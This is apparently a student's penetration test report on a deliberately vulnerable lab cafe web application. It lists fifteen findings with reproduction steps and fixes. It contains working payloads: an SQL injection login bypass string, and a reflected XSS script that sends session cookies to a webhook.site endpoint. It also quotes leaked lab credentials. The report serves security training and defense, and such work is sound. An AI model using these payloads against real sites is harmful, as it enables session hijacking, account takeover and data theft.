# Penetration Test Report — The Roasted Bean Cafe

**Tester:** Aayush Singaraju
**Date:** June 13, 2026
**Target:** 192.168.1.106 (internal lab environment)
**Engagement type:** Authorized lab assessment
**Tester platform:** Kali Linux (192.168.223.17), routed through pfSense firewall

---

## Executive Summary

The Roasted Bean Cafe web application is critically vulnerable. During a single assessment session, multiple independent attack paths were identified that grant unauthenticated and authenticated attackers full administrative access to the application and complete read access to all stored customer data, including passwords stored in plaintext.

The application fails at fundamental security principles: input validation, secure authentication, and protection of sensitive data. In a production scenario, an attacker would be able to compromise all user accounts, exfiltrate the entire database, and read internal application logs within minutes of initial reconnaissance.

This report documents the findings, demonstrates exploitation, and recommends remediation for each identified vulnerability.

---

## Scope

- **In scope:** All endpoints and services on 192.168.1.106
- **Out of scope:** Network infrastructure (pfSense, switches), DoS testing
- **Methodology:** OWASP Web Security Testing Guide aligned

---

## Methodology

The assessment followed standard offensive security methodology:

1. **Reconnaissance** — network and service identification via Nmap
2. **Enumeration** — directory and content discovery via Gobuster, manual browsing
3. **Vulnerability identification** — manual testing, source code review of client-side assets
4. **Exploitation** — manual confirmation of each finding with documented proof
5. **Post-exploitation** — data exfiltration, account impersonation, log review

---

## Findings Summary

The following vulnerabilities were identified and confirmed during this assessment:

- **CRITICAL-1:** SQL Injection — Admin Login Form
- **CRITICAL-2:** Default Credentials Disclosed in HTML/Client-Side Code
- **CRITICAL-3:** Plaintext Password Storage
- **CRITICAL-4:** Plaintext Passwords Visible in Admin Panel
- **CRITICAL-5:** Full Database Backup Exposed Without Authentication
- **HIGH-6:** Insecure Direct Object Reference (IDOR)
- **HIGH-7:** Session Cookie Missing HttpOnly Flag
- **HIGH-8:** Sensitive Data in Client-Side JavaScript
- **HIGH-9:** Insecure Client-Side Authentication Token
- **HIGH-10:** Reflected XSS on Menu Search
- **MEDIUM-11:** No Account Lockout or Rate Limiting
- **MEDIUM-12:** Missing CSRF Protection
- **MEDIUM-13:** Application Log File Disclosed
- **LOW-14:** Information Disclosure via robots.txt
- **LOW-15:** Server Version Disclosure in HTTP Response Headers

Total: 15 vulnerabilities confirmed (5 critical, 5 high, 3 medium, 2 low)

---

## Detailed Findings

### CRITICAL-1: SQL Injection — Admin Login Form

**Endpoint:** `/admin/login.php`
**CWE:** CWE-89 (SQL Injection)

**Discovery**

The admin login form does not parameterize user input before passing it to the underlying SQL query. Manual injection bypassed authentication entirely.

**Reproduction**

1. Navigate to `/admin/login.php`
2. In the username field, enter: `' OR '1'='1`
3. In the password field, enter: `' OR '1'='1`
4. Submit the form
5. Application returns an authenticated administrator session

**Impact**

Complete authentication bypass. An unauthenticated attacker gains full administrative access to the application without any prior knowledge of credentials. From this position, an attacker can read all customer data, modify menu items, and access internal logs.

**Remediation**

- Use parameterized queries (prepared statements) for all database operations
- Validate and sanitize all user input
- Implement a web application firewall as defense in depth

---

### CRITICAL-2: Default Credentials Disclosed in Client-Side Code

**Endpoint:** `/admin/login.php` (HTML source)
**CWE:** CWE-615 (Information Disclosure in Comments)

**Discovery**

Inspection of the login page source via browser developer tools revealed default administrative credentials embedded in HTML.

**Reproduction**

1. Navigate to `/admin/login.php`
2. Open browser developer tools (F12)
3. Inspect the HTML source
4. Observe credentials in source: `admin:admin123`
5. These credentials grant valid administrative access when used through the normal login flow

**Impact**

Any user with basic browser tools can authenticate as administrator without any technical skill. This is independent of and additive to the SQL injection vulnerability.

**Remediation**

- Remove all default and test credentials from production code
- Never include sensitive information in HTML comments or client-side code
- Perform pre-deployment code review for credential leakage

---

### CRITICAL-3: Plaintext Password Storage

**Endpoint:** Database `users` and `admins` tables
**CWE:** CWE-256 (Plaintext Storage of Password)

**Discovery**

After authenticating to the admin panel and dumping the database backup, user passwords were observed stored in plaintext. No hashing or encryption was applied.

**Reproduction**

1. Download `/backup.sql` (see CRITICAL-5)
2. Open the SQL file in any text editor
3. Observe `users` and `admins` tables containing password columns in cleartext

**Impact**

If the database is compromised through any vector (SQL injection, backup exposure, server compromise, insider threat), every user password is immediately usable. Users who reused passwords across services are also at risk on other platforms.

**Remediation**

- Hash all passwords using a modern algorithm: bcrypt, scrypt, or Argon2
- Use a unique random salt per password
- Never store plaintext passwords or reversibly encrypted passwords
- Migrate existing accounts at next user login (re-hash with new algorithm)

---

### CRITICAL-4: Plaintext Passwords Visible in Admin Panel

**Endpoint:** `/admin/users.php`
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Discovery**

The administrative user management panel displays all customer passwords in plaintext within the page.

**Reproduction**

1. Authenticate as administrator (any method above)
2. Navigate to `/admin/users.php`
3. Observe user list rendering plaintext passwords directly in the table

**Impact**

Compromises every authenticated user even when authentication is otherwise functioning. Combined with CRITICAL-1, an unauthenticated attacker can view all passwords within seconds.

**Remediation**

- Never display password fields, even to administrators
- Implement password reset flows instead of password viewing
- Administrators should never need access to user passwords directly

---

### CRITICAL-5: Full Database Backup Exposed

**Endpoint:** `/backup.sql`
**CWE:** CWE-538 (File and Directory Information Exposure)

**Discovery**

The robots.txt file (`/robots.txt`) discloses `/backup.sql` as a disallowed path. The file is directly downloadable without authentication.

**Reproduction**

1. View `/robots.txt`
2. Note disclosed path `/backup.sql`
3. Navigate directly to `/backup.sql`
4. Browser downloads the file containing full database schema and contents

**Impact**

Unauthenticated access to entire customer database, admin credentials, all stored data. This vulnerability alone is sufficient for full data breach.

**Remediation**

- Never store database backups within the web root
- Move backups to a directory not served by the web server
- If web-accessible backups are necessary, require authentication and encryption
- Audit all files in the web root for sensitive content

---

### HIGH-6: Insecure Direct Object Reference (IDOR)

**Endpoint:** `/profile.php?id=`
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Discovery**

The profile page accepts a user ID via URL parameter without validating that the authenticated user is authorized to view that profile.

**Reproduction**

1. Authenticate as any valid user
2. Navigate to `/profile.php?id=1`
3. Observe profile data for user 1
4. Modify the URL to `/profile.php?id=2`, `/profile.php?id=3`, etc.
5. Application returns each user's profile data without authorization check

**Impact**

Any authenticated user can enumerate and view the profile data of all other users. Combined with plaintext password storage, full account takeover is possible.

**Remediation**

- Implement authorization checks on every endpoint that returns user data
- Verify that the authenticated user is permitted to access the requested resource
- Use indirect references (e.g., UUIDs scoped to session) instead of sequential IDs

---

### HIGH-7: Session Cookie Missing HttpOnly Flag

**Endpoint:** Session cookies application-wide
**CWE:** CWE-1004 (Sensitive Cookie Without HttpOnly Flag)

**Discovery**

Nmap script `http-cookie-flags` identified that `PHPSESSID` is set without the HttpOnly attribute. This was confirmed via browser developer tools.

**Reproduction**

1. Visit any page on the application
2. Open browser developer tools → Storage → Cookies
3. Observe `PHPSESSID` cookie has HttpOnly = false

**Impact**

JavaScript executing in the user's browser can read the session cookie. When combined with any cross-site scripting vulnerability, this enables full session hijacking and account takeover without password disclosure.

**Remediation**

- Set the HttpOnly flag on all session cookies
- Set the Secure flag when serving over HTTPS
- Set SameSite=Strict to prevent cross-site request inclusion
- Example PHP: `session_set_cookie_params(['httponly' => true, 'secure' => true, 'samesite' => 'Strict']);`

---

### HIGH-8: Sensitive Data in Client-Side JavaScript

**Endpoint:** `/js/main.js`
**CWE:** CWE-615 (Information Disclosure in Comments)

**Discovery**

Inspection of the main JavaScript file revealed comments exposing sensitive information.

**Findings within source:**
- Hardcoded admin token: `rb_secret_2024`
- Hardcoded database password: `cafe1234`
- Debug TODO comments referencing internal architecture
- Statement that admin token is "checked client-side only"

**Reproduction**

1. Navigate to any page on the application
2. View source or visit `/js/main.js` directly
3. Observe sensitive values in source comments and variables

**Impact**

Anyone visiting the website can extract administrative tokens and database credentials. This is a developer hygiene issue that should never reach production.

**Remediation**

- Strip all debug comments before deployment
- Implement a build pipeline that removes development artifacts
- Never store secrets in client-side code regardless of intent
- Use server-side configuration management for all secrets

---

### HIGH-9: Insecure Client-Side Authentication Token

**Endpoint:** `admin_token` cookie usage
**CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security)

**Discovery**

JavaScript source comments explicitly state that the `admin_token` cookie is validated client-side only. This means an attacker can set the cookie value to the leaked secret and gain administrative access without any server-side check.

**Impact**

If exploited, this would bypass all server-side authentication. Combined with the leaked token value, this is an immediate authentication bypass.

**Remediation**

- All authentication tokens must be validated server-side
- Use cryptographically signed session tokens (JWT with HMAC, signed cookies)
- Treat all client-side code as untrusted

---

### HIGH-10: Reflected XSS on Menu Search

**Endpoint:** `/menu.php?search=`
**CWE:** CWE-79 (Cross-Site Scripting)

**Discovery**

The `search` parameter is reflected in the response HTML without sanitization or output encoding.

**Reproduction**

1. Navigate to `/menu.php?search=<script>alert(1)</script>`
2. JavaScript alert popup executes in browser context, confirming XSS

**Exploitation — cookie exfiltration**

Combined with the missing HttpOnly flag (HIGH-7), reflected XSS enables full session hijacking. Injected payload:

\`\`\`html
<script>new Image().src="https://webhook.site/[unique-id]?c="+document.cookie;</script>
\`\`\`

Result: `PHPSESSID` cookie successfully exfiltrated to attacker-controlled endpoint. Cookie can be replayed to impersonate the victim without their password.

**Impact**

Reflected XSS in a phishing link, combined with missing HttpOnly, allows account takeover of any victim who clicks the crafted URL. In a real deployment, an attacker could hijack admin sessions and gain full application control.

**Remediation**

- Output encode all user-controlled data before rendering in HTML
- Set HttpOnly on session cookies (also see HIGH-7)
- Implement Content Security Policy headers
- Use a framework that escapes by default (React, Vue, Django templates)

---

### MEDIUM-11: No Account Lockout or Rate Limiting

**Endpoint:** All login forms
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Discovery**

Repeated failed login attempts were submitted to the login form with no observed rate limiting, account lockout, CAPTCHA, or delay.

**Impact**

Brute force attacks against weak passwords are unimpeded. Tools like Hydra can attempt thousands of credentials per minute.

**Remediation**

- Implement progressive delays after failed attempts
- Lock accounts after N failed attempts within a time window
- Add CAPTCHA after the first 2-3 failures
- Log and monitor for brute force attempt patterns

---

### MEDIUM-12: Missing CSRF Protection

**Endpoint:** All forms
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Discovery**

Inspection of form HTML revealed no anti-CSRF tokens on any form, including login and state-changing operations.

**Impact**

An attacker can craft a malicious page that, when visited by an authenticated user, submits forged requests to the application on behalf of that user.

**Remediation**

- Implement CSRF tokens on all state-changing forms
- Validate tokens server-side before processing requests
- Set SameSite=Strict on session cookies as additional defense

---

### MEDIUM-13: Application Log File Disclosed

**Endpoint:** `/logs/admin_login.log`
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Discovery**

The `/logs/` directory is accessible without authentication. The admin login log contains login attempts including usernames, timestamps, and source IP addresses.

**Impact**

- Attackers can identify valid administrative usernames for targeted brute force
- Source IP addresses of legitimate administrators are exposed, enabling targeted attacks
- Failed login data could be used to identify password patterns

**Remediation**

- Move log files outside the web root
- Restrict access via web server configuration
- Never expose `/logs/` paths publicly

---

### LOW-14: Information Disclosure via robots.txt

**Endpoint:** `/robots.txt`
**CWE:** CWE-538 (File and Directory Information Exposure)

**Discovery**

The robots.txt file lists five sensitive paths intended to be hidden from search engines: `/admin/`, `/config/`, `/backup.sql`, `/logs/`, `/uploads/`.

**Impact**

Robots.txt is intended to instruct search engines, but it also acts as a roadmap for attackers. Listing sensitive paths confirms their existence and prioritizes them for exploitation.

**Remediation**

- Don't list sensitive paths in robots.txt
- Restrict access to sensitive paths via authentication, not through obscurity
- robots.txt should never be a security control

---

### LOW-15: Server Version Disclosure in HTTP Response Headers

**Endpoint:** All HTTP responses
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Discovery**

The HTTP `Server` response header discloses the exact Apache version: `Apache/2.4.66 (Ubuntu)`.

**Impact**

Allows attackers to look up known vulnerabilities for the exact server version, accelerating reconnaissance.

**Remediation**

- Configure `ServerTokens Prod` in Apache configuration
- Configure `ServerSignature Off`
- Consider running behind a reverse proxy that strips server headers

---

## Attack Chain Narrative

The most efficient attack path identified during this assessment:

1. **Recon** — Nmap revealed Apache on port 80, missing HttpOnly cookie flag, robots.txt with 5 disclosed paths
2. **Directory enumeration** — Gobuster identified `/admin/`, `/js/`, `/uploads/`, `/logs/`
3. **Source review** — Viewing `/js/main.js` revealed default credentials, database password, admin token
4. **Authentication bypass** — SQL injection (`' OR '1'='1`) on `/admin/login.php` granted admin access without using any of the leaked credentials
5. **Database exfiltration** — `/backup.sql` downloaded directly, revealing all user data and plaintext passwords
6. **Account enumeration** — IDOR on `/profile.php?id=` confirmed access to any user's profile data
7. **Log review** — `/logs/admin_login.log` accessed and read, revealing administrator login patterns and source IPs

This chain demonstrates multiple independent paths to total compromise, indicating that the application has no defense in depth. Failure of any single control would not have meaningfully delayed the attack.

---

## Recommendations

In order of priority:

### Immediate (do this first)

1. Patch SQL injection in all login forms via parameterized queries
2. Move `/backup.sql` and `/logs/` outside the web root
3. Remove default credentials and debug comments from all source code
4. Hash all passwords using bcrypt (rotate at next user login)

### Short-term (within one week)

5. Implement HttpOnly, Secure, and SameSite flags on session cookies
6. Add authorization checks to all endpoints returning user data (fix IDOR)
7. Implement rate limiting and account lockout on login forms
8. Add CSRF tokens to all forms

### Medium-term (within one month)

9. Implement server-side validation of all authentication tokens
10. Build a CI/CD pipeline that strips debug artifacts before deployment
11. Conduct security code review of all admin endpoints
12. Implement Content Security Policy headers

### Long-term

13. Establish a vulnerability disclosure program
14. Conduct quarterly penetration tests
15. Implement security training for developers

---

## Tools Used

- Nmap 7.98 (network and service enumeration)
- Gobuster 3.8.2 (directory enumeration)
- Firefox developer tools (source inspection)
- SQLMap (attempted, fell back to manual injection)
- curl (manual HTTP requests)

---

## Conclusion

The Roasted Bean Cafe web application is critically vulnerable across multiple categories. The vulnerabilities identified are not edge cases — they represent fundamental violations of widely understood secure development practices. Remediation should be treated as an emergency: until the SQL injection and plaintext password storage are addressed, this application should not be operated in any environment containing real user data.

---

## Acknowledgments and Limitations

This assessment was conducted in a controlled lab environment as part of structured cybersecurity training. Time was constrained to a single session. Vulnerabilities identified in the lab's vulnerability map but not exploited during this session include:

- Command injection on `/admin/backup.php`
- Path traversal on `/download.php`
- Stored XSS via `/contact.php`
- Multiple additional SQL injection points

These represent expansion targets for follow-up assessment.
